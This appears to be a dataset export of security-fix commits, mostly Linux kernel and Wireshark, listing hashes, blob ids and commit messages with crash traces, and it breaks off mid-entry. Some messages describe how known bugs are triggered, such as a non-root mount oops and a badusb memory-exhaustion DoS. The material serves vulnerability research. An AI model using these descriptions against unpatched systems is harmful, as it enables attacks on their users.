    9af0df15256e9405082fdb59d1a2c6fe97fb8e59
    aae331a5d03b2591e670c9a08451bd00ad8e66f9
    b394ca5307ecf49345520fd9f2755d9d5b198bb1
    b5f97c605d988f1cc7a15ae5a76e9643c2a18507
    b7f831089500920554e5bd371ee39064701d676e
    c524fdddc7fb1f601d6d06ddb46d0affcca89c08
    c7221bb19801e6b6251ad1ed3cea6f4f79dcf876
    cbaa998ad6252ae36ba587bd3856d812bde7dd1f
    d15c63e97ef1e6df711c9e78c1e72c77cd69709e
    d42514e32380b5edb38f7985069efe8d8ccc80fa
    ddb846f878b8a015414293019fd6d7b5a7ec735b
    df8787745b601561aa7d95114e5f55e400338c50
Projects:
    0-T-0_ps4-linux
Commit Message for 5ec0811d30378ae104f250bfc9b3640242d81e3f:
propogate_mnt: Handle the first propogated copy being a slave\n\nWhen the first propgated copy was a slave the following oops would result: > BUG: unable to handle kernel NULL pointer dereference at 0000000000000010 > IP: [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 > PGD bacd4067 PUD bac66067 PMD 0 > Oops: 0000 [#1] SMP > Modules linked in: > CPU: 1 PID: 824 Comm: mount Not tainted 4.6.0-rc5userns+ #1523 > Hardware name: Bochs Bochs, BIOS Bochs 01/01/2007 > task: ffff8800bb0a8000 ti: ffff8800bac3c000 task.ti: ffff8800bac3c000 > RIP: 0010:[<ffffffff811fba4e>]  [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 > RSP: 0018:ffff8800bac3fd38  EFLAGS: 00010283 > RAX: 0000000000000000 RBX: ffff8800bb77ec00 RCX: 0000000000000010 > RDX: 0000000000000000 RSI: ffff8800bb58c000 RDI: ffff8800bb58c480 > RBP: ffff8800bac3fd48 R08: 0000000000000001 R09: 0000000000000000 > R10: 0000000000001ca1 R11: 0000000000001c9d R12: 0000000000000000 > R13: ffff8800ba713800 R14: ffff8800bac3fda0 R15: ffff8800bb77ec00 > FS:  00007f3c0cd9b7e0(0000) GS:ffff8800bfb00000(0000) knlGS:0000000000000000 > CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 > CR2: 0000000000000010 CR3: 00000000bb79d000 CR4: 00000000000006e0 > Stack: >  ffff8800bb77ec00 0000000000000000 ffff8800bac3fd88 ffffffff811fbf85 >  ffff8800bac3fd98 ffff8800bb77f080 ffff8800ba713800 ffff8800bb262b40 >  0000000000000000 0000000000000000 ffff8800bac3fdd8 ffffffff811f1da0 > Call Trace: >  [<ffffffff811fbf85>] propagate_mnt+0x105/0x140 >  [<ffffffff811f1da0>] attach_recursive_mnt+0x120/0x1e0 >  [<ffffffff811f1ec3>] graft_tree+0x63/0x70 >  [<ffffffff811f1f6b>] do_add_mount+0x9b/0x100 >  [<ffffffff811f2c1a>] do_mount+0x2aa/0xdf0 >  [<ffffffff8117efbe>] ? strndup_user+0x4e/0x70 >  [<ffffffff811f3a45>] SyS_mount+0x75/0xc0 >  [<ffffffff8100242b>] do_syscall_64+0x4b/0xa0 >  [<ffffffff81988f3c>] entry_SYSCALL64_slow_path+0x25/0x25 > Code: 00 00 75 ec 48 89 0d 02 22 22 01 8b 89 10 01 00 00 48 89 05 fd 21 22 01 39 8e 10 01 00 00 0f 84 e0 00 00 00 48 8b 80 d8 00 00 00 <48> 8b 50 10 48 89 05 df 21 22 01 48 89 15 d0 21 22 01 8b 53 30 > RIP  [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 >  RSP <ffff8800bac3fd38> > CR2: 0000000000000010 > ---[ end trace 2725ecd95164f217 ]---\n\nThis oops happens with the namespace_sem held and can be triggered by non-root users.  An all around not pleasant experience.\n\nTo avoid this scenario when finding the appropriate source mount to copy stop the walk up the mnt_master chain when the first source mount is encountered.\n\nFurther rewrite the walk up the last_source mnt_master chain so that it is clear what is going on.\n\nThe reason why the first source mount is special is that it it's mnt_parent is not a mount in the dest_mnt propagation tree, and as such termination conditions based up on the dest_mnt mount propgation tree do not make sense.\n\nTo avoid other kinds of confusion last_dest is not changed when computing last_source.  last_dest is only used once in propagate_one and that is above the point of the code being modified, so changing the global variable is meaningless and confusing.\n\nCc: stable@vger.kernel.org fixes: f2ebb3a921c1ca1e2ddd9242e95a1989a50c4c68 ("smarter propagate_mnt()") Reported-by: Tycho Andersen <tycho.andersen@canonical.com> Reviewed-by: Seth Forshee <seth.forshee@canonical.com> Tested-by: Seth Forshee <seth.forshee@canonical.com> Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    1f461dcdd296eecedaffffc6bae2bfa90bd7eb89
File(s) In Commit: 
    drivers/net/ppp/ppp_generic.c
Blob(s) In Commit: 
    f572b31a2b20cef55e560b8db932c419f14bd8b3
Blob(s) Before Fix: 
    0481daf9201a28eafbdde2798907bc0318a13ed1
    04f4eb34fa8084aecc5a4db4cac08e73acf76b1c
    4fd861063ed46cc13a17804719c92d2e90fe2cb2
    794a4732936883c662212e0769e62993e67d96b0
    91d6c1272fcf0ae4a655fa74ca6b91fb578a6108
    9a863c6a6a33aa7883f6fa105fca917ae177e25c
    9d15566521a719b525a28a009f1d999c91a00da2
    aafe237b25acc28ab0c13f774a7f07373631d594
    af034dba9bd62a693ba81dd04479cd11ffc7f10e
    d61da9ece3ba021a7aa68253efe8dd82198cb575
    ed00446759b2546d9026010d8b5148bc03ae2d95
    fc8ad001bc949e894e7659301af65565a5a21046
Projects:
    0-T-0_ps4-linux
Commit Message for 1f461dcdd296eecedaffffc6bae2bfa90bd7eb89:
ppp: take reference on channels netns\n\nLet channels hold a reference on their network namespace. Some channel types, like ppp_async and ppp_synctty, can have their userspace controller running in a different namespace. Therefore they can't rely on them to preclude their netns from being removed from under them.\n\n================================================================== BUG: KASAN: use-after-free in ppp_unregister_channel+0x372/0x3a0 at addr ffff880064e217e0 Read of size 8 by task syz-executor/11581 ============================================================================= BUG net_namespace (Not tainted): kasan: bad access detected -----------------------------------------------------------------------------\n\nDisabling lock debugging due to kernel taint INFO: Allocated in copy_net_ns+0x6b/0x1a0 age=92569 cpu=3 pid=6906 [<      none      >] ___slab_alloc+0x4c7/0x500 kernel/mm/slub.c:2440 [<      none      >] __slab_alloc+0x4c/0x90 kernel/mm/slub.c:2469 [<     inline     >] slab_alloc_node kernel/mm/slub.c:2532 [<     inline     >] slab_alloc kernel/mm/slub.c:2574 [<      none      >] kmem_cache_alloc+0x23a/0x2b0 kernel/mm/slub.c:2579 [<     inline     >] kmem_cache_zalloc kernel/include/linux/slab.h:597 [<     inline     >] net_alloc kernel/net/core/net_namespace.c:325 [<      none      >] copy_net_ns+0x6b/0x1a0 kernel/net/core/net_namespace.c:360 [<      none      >] create_new_namespaces+0x2f6/0x610 kernel/kernel/nsproxy.c:95 [<      none      >] copy_namespaces+0x297/0x320 kernel/kernel/nsproxy.c:150 [<      none      >] copy_process.part.35+0x1bf4/0x5760 kernel/kernel/fork.c:1451 [<     inline     >] copy_process kernel/kernel/fork.c:1274 [<      none      >] _do_fork+0x1bc/0xcb0 kernel/kernel/fork.c:1723 [<     inline     >] SYSC_clone kernel/kernel/fork.c:1832 [<      none      >] SyS_clone+0x37/0x50 kernel/kernel/fork.c:1826 [<      none      >] entry_SYSCALL_64_fastpath+0x16/0x7a kernel/arch/x86/entry/entry_64.S:185\n\nINFO: Freed in net_drop_ns+0x67/0x80 age=575 cpu=2 pid=2631 [<      none      >] __slab_free+0x1fc/0x320 kernel/mm/slub.c:2650 [<     inline     >] slab_free kernel/mm/slub.c:2805 [<      none      >] kmem_cache_free+0x2a0/0x330 kernel/mm/slub.c:2814 [<     inline     >] net_free kernel/net/core/net_namespace.c:341 [<      none      >] net_drop_ns+0x67/0x80 kernel/net/core/net_namespace.c:348 [<      none      >] cleanup_net+0x4e5/0x600 kernel/net/core/net_namespace.c:448 [<      none      >] process_one_work+0x794/0x1440 kernel/kernel/workqueue.c:2036 [<      none      >] worker_thread+0xdb/0xfc0 kernel/kernel/workqueue.c:2170 [<      none      >] kthread+0x23f/0x2d0 kernel/drivers/block/aoe/aoecmd.c:1303 [<      none      >] ret_from_fork+0x3f/0x70 kernel/arch/x86/entry/entry_64.S:468 INFO: Slab 0xffffea0001938800 objects=3 used=0 fp=0xffff880064e20000 flags=0x5fffc0000004080 INFO: Object 0xffff880064e20000 @offset=0 fp=0xffff880064e24200\n\nCPU: 1 PID: 11581 Comm: syz-executor Tainted: G    B           4.4.0+ Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.8.2-0-g33fbe13 by qemu-project.org 04/01/2014  00000000ffffffff ffff8800662c7790 ffffffff8292049d ffff88003e36a300  ffff880064e20000 ffff880064e20000 ffff8800662c77c0 ffffffff816f2054  ffff88003e36a300 ffffea0001938800 ffff880064e20000 0000000000000000 Call Trace:  [<     inline     >] __dump_stack kernel/lib/dump_stack.c:15  [<ffffffff8292049d>] dump_stack+0x6f/0xa2 kernel/lib/dump_stack.c:50  [<ffffffff816f2054>] print_trailer+0xf4/0x150 kernel/mm/slub.c:654  [<ffffffff816f875f>] object_err+0x2f/0x40 kernel/mm/slub.c:661  [<     inline     >] print_address_description kernel/mm/kasan/report.c:138  [<ffffffff816fb0c5>] kasan_report_error+0x215/0x530 kernel/mm/kasan/report.c:236  [<     inline     >] kasan_report kernel/mm/kasan/report.c:259  [<ffffffff816fb4de>] __asan_report_load8_noabort+0x3e/0x40 kernel/mm/kasan/report.c:280  [<     inline     >] ? ppp_pernet kernel/include/linux/compiler.h:218  [<ffffffff83ad71b2>] ? ppp_unregister_channel+0x372/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392  [<     inline     >] ppp_pernet kernel/include/linux/compiler.h:218  [<ffffffff83ad71b2>] ppp_unregister_channel+0x372/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392  [<     inline     >] ? ppp_pernet kernel/drivers/net/ppp/ppp_generic.c:293  [<ffffffff83ad6f26>] ? ppp_unregister_channel+0xe6/0x3a0 kernel/drivers/net/ppp/ppp_generic.c:2392  [<ffffffff83ae18f3>] ppp_asynctty_close+0xa3/0x130 kernel/drivers/net/ppp/ppp_async.c:241  [<ffffffff83ae1850>] ? async_lcp_peek+0x5b0/0x5b0 kernel/drivers/net/ppp/ppp_async.c:1000  [<ffffffff82c33239>] tty_ldisc_close.isra.1+0x99/0xe0 kernel/drivers/tty/tty_ldisc.c:478  [<ffffffff82c332c0>] tty_ldisc_kill+0x40/0x170 kernel/drivers/tty/tty_ldisc.c:744  [<ffffffff82c34943>] tty_ldisc_release+0x1b3/0x260 kernel/drivers/tty/tty_ldisc.c:772  [<ffffffff82c1ef21>] tty_release+0xac1/0x13e0 kernel/drivers/tty/tty_io.c:1901  [<ffffffff82c1e460>] ? release_tty+0x320/0x320 kernel/drivers/tty/tty_io.c:1688  [<ffffffff8174de36>] __fput+0x236/0x780 kernel/fs/file_table.c:208  [<ffffffff8174e405>] ____fput+0x15/0x20 kernel/fs/file_table.c:244  [<ffffffff813595ab>] task_work_run+0x16b/0x200 kernel/kernel/task_work.c:115  [<     inline     >] exit_task_work kernel/include/linux/task_work.h:21  [<ffffffff81307105>] do_exit+0x8b5/0x2c60 kernel/kernel/exit.c:750  [<ffffffff813fdd20>] ? debug_check_no_locks_freed+0x290/0x290 kernel/kernel/locking/lockdep.c:4123  [<ffffffff81306850>] ? mm_update_next_owner+0x6f0/0x6f0 kernel/kernel/exit.c:357  [<ffffffff813215e6>] ? __dequeue_signal+0x136/0x470 kernel/kernel/signal.c:550  [<ffffffff8132067b>] ? recalc_sigpending_tsk+0x13b/0x180 kernel/kernel/signal.c:145  [<ffffffff81309628>] do_group_exit+0x108/0x330 kernel/kernel/exit.c:880  [<ffffffff8132b9d4>] get_signal+0x5e4/0x14f0 kernel/kernel/signal.c:2307  [<     inline     >] ? kretprobe_table_lock kernel/kernel/kprobes.c:1113  [<ffffffff8151d355>] ? kprobe_flush_task+0xb5/0x450 kernel/kernel/kprobes.c:1158  [<ffffffff8115f7d3>] do_signal+0x83/0x1c90 kernel/arch/x86/kernel/signal.c:712  [<ffffffff8151d2a0>] ? recycle_rp_inst+0x310/0x310 kernel/include/linux/list.h:655  [<ffffffff8115f750>] ? setup_sigcontext+0x780/0x780 kernel/arch/x86/kernel/signal.c:165  [<ffffffff81380864>] ? finish_task_switch+0x424/0x5f0 kernel/kernel/sched/core.c:2692  [<     inline     >] ? finish_lock_switch kernel/kernel/sched/sched.h:1099  [<ffffffff81380560>] ? finish_task_switch+0x120/0x5f0 kernel/kernel/sched/core.c:2678  [<     inline     >] ? context_switch kernel/kernel/sched/core.c:2807  [<ffffffff85d794e9>] ? __schedule+0x919/0x1bd0 kernel/kernel/sched/core.c:3283  [<ffffffff81003901>] exit_to_usermode_loop+0xf1/0x1a0 kernel/arch/x86/entry/common.c:247  [<     inline     >] prepare_exit_to_usermode kernel/arch/x86/entry/common.c:282  [<ffffffff810062ef>] syscall_return_slowpath+0x19f/0x210 kernel/arch/x86/entry/common.c:344  [<ffffffff85d88022>] int_ret_from_sys_call+0x25/0x9f kernel/arch/x86/entry/entry_64.S:281 Memory state around the buggy address:  ffff880064e21680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb  ffff880064e21700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb >ffff880064e21780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb                                                        ^  ffff880064e21800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb  ffff880064e21880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ==================================================================\n\nFixes: 273ec51dd7ce ("net: ppp_generic - introduce net-namespace functionality v2") Reported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Guillaume Nault <g.nault@alphalink.fr> Reviewed-by: Cyrill Gorcunov <gorcunov@openvz.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1c0808d580da09fdec5a9a74ff09e103ea058dd4
File(s) In Commit: 
    lib/http2/connection.c
Blob(s) In Commit: 
    6be9615e11f3572216313b7ea6fc0509bbd594e7
Blob(s) Before Fix: 
    9f8e3fa76d22073b05a4db6e6936cb68822d7a49
Projects:
    012huang_you-get
Commit Message for 1c0808d580da09fdec5a9a74ff09e103ea058dd4:
h2: use after free on premature connection close #920\n\nlib/http2/connection.c:on_read() calls parse_input(), which might free `conn`. It does so in particular if the connection preface isn't the expected one in expect_preface(). `conn` is then used after the free in `if (h2o_timeout_is_linked(&conn->_write.timeout_entry)`. We fix this by adding a return value to close_connection that returns a negative value if `conn` has been free'd and can't be used anymore.\n\nCredits for finding the bug to Tim Newsham.

======================================================================
Commit With Fix: 
    b4dcbba7a8eb09ba9d38fc69807a8861255736d0
File(s) In Commit: 
    site/search.php
Blob(s) In Commit: 
    87e5c7fc8bae6ee879d6da114472c705ee01ce17
Blob(s) Before Fix: 
    ddc852a53f1250d364b48cb023c0af0baa00bc0b
Projects:
    ajgl_ossec-wui
Commit Message for b4dcbba7a8eb09ba9d38fc69807a8861255736d0:
Unanchored regex would allow badness through.  This patch eliminates a XSS identified by JPCERT Reference number: JVN#58455472

======================================================================
Commit With Fix: 
    99d825822eade8d827a1817357cbf3f889a552d6
File(s) In Commit: 
    fs/isofs/rock.c
Blob(s) In Commit: 
    98b3eb7d8eaf64d5eb006801aeb130ff8503f593
Blob(s) Before Fix: 
    0ec137310320f080316c5e6111198b842a77303e
    204659a5f6db5b5328bc964c8d3931290ef9f3e6
    5384ceb35b1cc829442d6aa440db19c553a6eed8
    70e79d0c756a9418155239f18f68d55323809e08
    735d7522a3a911f19af593d6b5f7d366d6cf448d
    c0bf42472e408fd16911cee33f3d9079943aa46a
    f488bbae541ac8d5db4eb7e963c33452ebb3e937
Projects:
    0-T-0_ps4-linux
Commit Message for 99d825822eade8d827a1817357cbf3f889a552d6:
get_rock_ridge_filename(): handle malformed NM entries\n\nPayloads of NM entries are not supposed to contain NUL.  When we run into such, only the part prior to the first NUL goes into the concatenation (i.e. the directory entry name being encoded by a bunch of NM entries).  We do stop when the amount collected so far + the claimed amount in the current NM entry exceed 254.  So far, so good, but what we return as the total length is the sum of *claimed* sizes, not the actual amount collected.  And that can grow pretty large - not unlimited, since you'd need to put CE entries in between to be able to get more than the maximum that could be contained in one isofs directory entry / continuation chunk and we are stop once we'd encountered 32 CEs, but you can get about 8Kb easily.  And that's what will be passed to readdir callback as the name length.  8Kb __copy_to_user() from a buffer allocated by __get_free_page()\n\nCc: stable@vger.kernel.org # 0.98pl6+ (yes, really) Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    45e093ae2830cd1264677d47ff9a95a71f5d9f9c
File(s) In Commit: 
    net/tipc/socket.c
Blob(s) In Commit: 
    3b7a79991d55ddb4dc3f6629ac37c7cd6ebf1a87
Blob(s) Before Fix: 
    12628890c2190b9cff66a12d2d2169c1192be761
    3eeb50a27b89b6d9607b51b80a5ed5ce715235e4
    4d420bb273960cd6eac206753f25435970f2724d
    69c29050f14abe8c926db671dfa05c96f2ddc3bc
Projects:
    0-T-0_ps4-linux
Commit Message for 45e093ae2830cd1264677d47ff9a95a71f5d9f9c:
tipc: check nl sock before parsing nested attributes\n\nMake sure the socket for which the user is listing publication exists before parsing the socket netlink attributes.\n\nPrior to this patch a call without any socket caused a NULL pointer dereference in tipc_nl_publ_dump().\n\nTested-and-reported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Richard Alpe <richard.alpe@ericsson.com> Acked-by: Jon Maloy <jon.maloy@ericsson.cm> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0da8b8b801f9276359262f1ef8274c7812d3dfda
File(s) In Commit: 
    ext/standard/html.c
Blob(s) In Commit: 
    81d8aff9e9adb54c09de2fda1277610b291780cb
Blob(s) Before Fix: 
    72423b59f0e4d2afca33bc2b05ac09ee74fbd751
Projects:
    0014593_php-src
Commit Message for 0da8b8b801f9276359262f1ef8274c7812d3dfda:
Fix bug #72135 - don't create strings with lengths outside int range

======================================================================
Commit With Fix: 
    d2dc9481d2af25b035778c67eaf0bfd2d2c59dd8
File(s) In Commit: 
    libraries/error_report.lib.php
Blob(s) In Commit: 
    856425606f9c15307ec8f9990f355276cdb01a1b
Blob(s) Before Fix: 
    0ac7ce56b80e9df4ac750b5fb0ec84855d4a75c4
    1d7741e816c0d4a76a9a66b123c9efa9a63b81bd
    5766b01f360607408a05ad799ae16c698f08a722
    9a9768a4106dae523e5b1b5b48b5b7f2e03fe757
    fd35956f3f83fdb14c7a65e66cb25deafd05161e
Projects:
    007durgesh219_phpmyadmin
Commit Message for d2dc9481d2af25b035778c67eaf0bfd2d2c59dd8:
Fix possible path existence disclossure\n\nOn non released versions (where line counts are not precalculated) it was possible to check for file existence due to limited checks for supplied path.\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    4dc1a2d7931017d3625f2d7cff70a17ce58b53b4
File(s) In Commit: 
    src/gd_xbm.c
Blob(s) In Commit: 
    d28fdfc564afc709f23d72cddd7bdcb3f525d43c
Blob(s) Before Fix: 
    74d839b2667882ce4afd37042365e6bc56d41177
Projects:
    86salo_libgd
Commit Message for 4dc1a2d7931017d3625f2d7cff70a17ce58b53b4:
xbm: avoid stack overflow (read) with large names #211\n\nWe use the name passed in to printf into a local stack buffer which is limited to 4000 bytes.  So given a large enough value, lots of stack data is leaked.  Rewrite the code to do simple memory copies with most of the strings to avoid that issue, and only use stack buffer for small numbers of constant size.\n\nThis closes #211.

======================================================================
Commit With Fix: 
    5d2be1422e02ccd697ccfcd45c85b4a26e6178e2
File(s) In Commit: 
    net/tipc/netlink_compat.c
Blob(s) In Commit: 
    3ad9fab1985f1cdca35c876f0f228d28b9b5db00
Blob(s) Before Fix: 
    1eadc95e113294c159a6e5288db831e142be77dc
    2c016fdefe977e1fa4f9700a6d44a9ad53c0b75c
    4dfc5c14f8c3c3f38a0fa0f1bfdcf40ff61ace07
    53e0fee800864e4b8c29ed793d60a5823d59c773
    ce9121e8e990302d104902b977ce7304949de0ef
    d7d050f44fc131942b5e87ab3ce23edbc8376684
    f795b1dd0ccdf3dc088e16e1e9ad3ae9cc978d16
Projects:
    0-T-0_ps4-linux
Commit Message for 5d2be1422e02ccd697ccfcd45c85b4a26e6178e2:
tipc: fix an infoleak in tipc_nl_compat_link_dump\n\nlink_info.str is a char array of size 60. Memory after the NULL byte is not initialized. Sending the whole object out can cause a leak.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4116def2337991b39919f3b448326e21c40e0dbb
File(s) In Commit: 
    net/rds/recv.c
Blob(s) In Commit: 
    8413f6c99e13519d7cbfa1ec6ce3877a0059caa7
Blob(s) Before Fix: 
    5c6e9f1320266cf175ed55ea69e3a7c28437ce1b
    a00462b0d01de9ee2793d4fb273bf568b2eefc29
    c0be1ecd11c99ce57360687fa2b34f312c0cf0d6
    cbfabdf3ff481c6b664bd06c53f22d26e65f1416
    f9ec1acd801cb182372e38a6f3c26d1dbe535137
Projects:
    0-T-0_ps4-linux
Commit Message for 4116def2337991b39919f3b448326e21c40e0dbb:
rds: fix an infoleak in rds_inc_info_copy\n\nThe last field "flags" of object "minfo" is not initialized. Copying this object out may leak kernel stack data. Assign 0 to it to avoid leak.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b4d16b4495b732888e12baf5b8a7e9bf2665e22b
File(s) In Commit: 
    epan/dissectors/packet-dcerpc-spoolss.c
Blob(s) In Commit: 
    22eef3c5ad992305b60a49821c5a998b950361c1
Blob(s) Before Fix: 
    8774e3416a891ee010d6be631dea668a5540e013
Projects:
    280455936_wireshark
Commit Message for b4d16b4495b732888e12baf5b8a7e9bf2665e22b:
SPOOLSS: Try to avoid an infinite loop.\n\nUse tvb_reported_length_remaining in dissect_spoolss_uint16uni. Make sure our offset always increments in dissect_spoolss_keybuffer.\n\nChange-Id: I7017c9685bb2fa27161d80a03b8fca4ef630e793 Reviewed-on: https://code.wireshark.org/review/14687 Reviewed-by: Gerald Combs <gerald@wireshark.org> Petri-Dish: Gerald Combs <gerald@wireshark.org> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Michael Mann <mmann78@netscape.net>

======================================================================
Commit With Fix: 
    9b0b20b8d5f8c9f7839d58ff6c5900f7e19283b4
File(s) In Commit: 
    epan/crypt/airpdcap.c
Blob(s) In Commit: 
    1212cdde7c6f02a1514cde6fbdafa2b9505e2415
Blob(s) Before Fix: 
    dd948a0d1d67ca3172748cd14866c1caec653097
Projects:
    280455936_wireshark
Commit Message for 9b0b20b8d5f8c9f7839d58ff6c5900f7e19283b4:
Make sure EAPOL body is big enough for a EAPOL_RSN_KEY.\n\nA pointer to a EAPOL_RSN_KEY is set on the packet presuming the whole EAPOL_RSN_KEY is there.  That's not always the case for fuzzed/malicious captures.\n\nBug: 11585 Change-Id: Ib94b8aceef444c7820e43b969596efdb8dbecccd Reviewed-on: https://code.wireshark.org/review/15540 Reviewed-by: Michael Mann <mmann78@netscape.net> Petri-Dish: Michael Mann <mmann78@netscape.net> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Anders Broman <a.broman58@gmail.com>

======================================================================
Commit With Fix: 
    b6d838eebf4456192360654092e5587c5207f185
File(s) In Commit: 
    epan/crypt/airpdcap.c
Blob(s) In Commit: 
    dd948a0d1d67ca3172748cd14866c1caec653097
Blob(s) Before Fix: 
    bb4d7bc43de5867f8cf94be055b48c634d349c32
Projects:
    280455936_wireshark
Commit Message for b6d838eebf4456192360654092e5587c5207f185:
Sanity check eapol_len in AirPDcapDecryptWPABroadcastKey\n\nBug: 12175 Change-Id: Iaf977ba48f8668bf8095800a115ff9a3472dd893 Reviewed-on: https://code.wireshark.org/review/15326 Petri-Dish: Michael Mann <mmann78@netscape.net> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Alexis La Goutte <alexis.lagoutte@gmail.com> Reviewed-by: Peter Wu <peter@lekensteyn.nl> Tested-by: Peter Wu <peter@lekensteyn.nl>

======================================================================
Commit With Fix: 
    7d7190695ce2ff269fdffb04e87139995cde21f4
File(s) In Commit: 
    epan/dissectors/packet-umts_fp.c
Blob(s) In Commit: 
    5552e0cceedd0074d023ff1890332f6c3cde0b34
Blob(s) Before Fix: 
    b1178865a0957485f86fd4402b7d7ad8802f14bd
Projects:
    280455936_wireshark
Commit Message for 7d7190695ce2ff269fdffb04e87139995cde21f4:
UMTS_FP: fix handling reserved C/T value\n\nThe spec puts the reserved value at 0xf but our internal table has 'unknown' at 0  since all the other values seem to be offset-by-one, just take the modulus 0xf to avoid running off the end of the table.\n\nBug: 12191 Change-Id: I83c8fb66797bbdee52a2246fb1eea6e37cbc7eb0 Reviewed-on: https://code.wireshark.org/review/15722 Reviewed-by: Evan Huus <eapache@gmail.com> Petri-Dish: Evan Huus <eapache@gmail.com> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Michael Mann <mmann78@netscape.net>

======================================================================
Commit With Fix: 
    b8e0d416898bb975a02c1b55883342edc5b4c9c0
File(s) In Commit: 
    epan/dissectors/packet-wbxml.c
Blob(s) In Commit: 
    ae5425a4d96fdb151a1221da7fa12c8ca42d6de8
Blob(s) Before Fix: 
    095677758e09e8fa81510c18f08639597f52bee1
Projects:
    280455936_wireshark
Commit Message for b8e0d416898bb975a02c1b55883342edc5b4c9c0:
WBXML: add a basic sanity check for offset overflow\n\nThis is a naive approach allowing to detact that something went wrong, without the need to replace all proto_tree_add_text() calls as what was done in master-2.0 branch.\n\nBug: 12408 Change-Id: Ia14905005e17ae322c2fc639ad5e491fa08b0108 Reviewed-on: https://code.wireshark.org/review/15310 Reviewed-by: Michael Mann <mmann78@netscape.net> Reviewed-by: Pascal Quantin <pascal.quantin@gmail.com>

======================================================================
Commit With Fix: 
    152d6d95632d8b9477c170f1de99bcd86d7fb1d6
File(s) In Commit: 
    programs/pluto/ikev1.c
Blob(s) In Commit: 
    8bc61837ac09399c39912264d652121f87674730
Blob(s) Before Fix: 
    67734dfcae4ba8f373a507bdc9cd2f7b5ee8dcb1
Projects:
    123kayi_libreswan
Commit Message for 152d6d95632d8b9477c170f1de99bcd86d7fb1d6:
IKEv1: packet retransmit fixes for Main/Aggr/Xauth modes\n\n- Do not schedule retransmits for inI1outR1 packets (prevent DDOS) - Do schedule retransmits for XAUTH packets

======================================================================
Commit With Fix: 
    aa93d1fee85c890a34f2510a310e55ee76a27848
File(s) In Commit: 
    drivers/media/usb/airspy/airspy.c
Blob(s) In Commit: 
    92d9d4214c3adb326dc1a23d0c2c43840172611c
Blob(s) Before Fix: 
    4069234abed5432c7fbf2f867da9c0235d4eba37
    565a59310747680858bb2bf30543e05becd579a0
    8251942bcd121ee339ddd4ba55645c918773a410
    87c12930416f565a118c145501e54df1a6b13cc7
    cb0e515d80ae378e7e26edecfa196c4024d7dd4b
Projects:
    0-T-0_ps4-linux
Commit Message for aa93d1fee85c890a34f2510a310e55ee76a27848:
media: fix airspy usb probe error path\n\nFix a memory leak on probe error of the airspy usb device driver.\n\nThe problem is triggered when more than 64 usb devices register with v4l2 of type VFL_TYPE_SDR or VFL_TYPE_SUBDEV.\n\nThe memory leak is caused by the probe function of the airspy driver mishandeling errors and not freeing the corresponding control structures when an error occours registering the device to v4l2 core.\n\nA badusb device can emulate 64 of these devices, and then through continual emulated connect/disconnect of the 65th device, cause the kernel to run out of RAM and crash the kernel, thus causing a local DOS vulnerability.\n\nFixes CVE-2016-5400\n\nSigned-off-by: James Patrick-Evans <james@jmp-e.com> Reviewed-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org # 3.17+ Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    dfd6b54ce33960e420fb206d8872fb759b577ad9
File(s) In Commit: 
    libarchive/archive_write_disk_posix.c
Blob(s) In Commit: 
    abe1a86d2885cabc99354d3ddf7c105873b94301
Blob(s) Before Fix: 
    8f0421e788a8821af760230b34e0898d214857ae
Projects:
    AasemShokr_libarchive
Commit Message for dfd6b54ce33960e420fb206d8872fb759b577ad9:
Fixes for Issue #745 and Issue #746 from Doran Moppert.

======================================================================
Commit With Fix: 
    f03b986b4439e20b0fd635109b48afe96cf0099b
File(s) In Commit: 
    src/JOSE/JWE.php
Blob(s) In Commit: 
    964d8ce75f695dfc70c536cd9049f4064b6629ec
Blob(s) Before Fix: 
    1f8bc6c3e8f813ab9f93bd7c724bfa7e85787b2b
    4bc1923ddd472db63c4a5504e065c9d1455b7f2f
Projects:
    30mw002_jose-1
Commit Message for f03b986b4439e20b0fd635109b48afe96cf0099b:
one more hash_equals, and better CEK decryption error handling

======================================================================
Commit With Fix: 
    1cce55e27adf0274193eb1cd74b927a398a3df4b
File(s) In Commit: 
    src/JOSE/JWS.php
Blob(s) In Commit: 
    60c1cbb3a73e008df4918f2ee5bac3929dda5e6c
Blob(s) Before Fix: 
    950d6b4b475798c6b2cf590e74ee51f2e8d15f41
Projects:
    30mw002_jose-1
Commit Message for 1cce55e27adf0274193eb1cd74b927a398a3df4b:
explicit alg check & secure hash comparison

======================================================================
Commit With Fix: 
    75ff39ccc1bd5d3c455b6822ab09e533c551f758
File(s) In Commit: 
    net/ipv4/tcp_input.c
Blob(s) In Commit: 
    91868bb1781864cdf316ca5efc6be1d70d967407
Blob(s) Before Fix: 
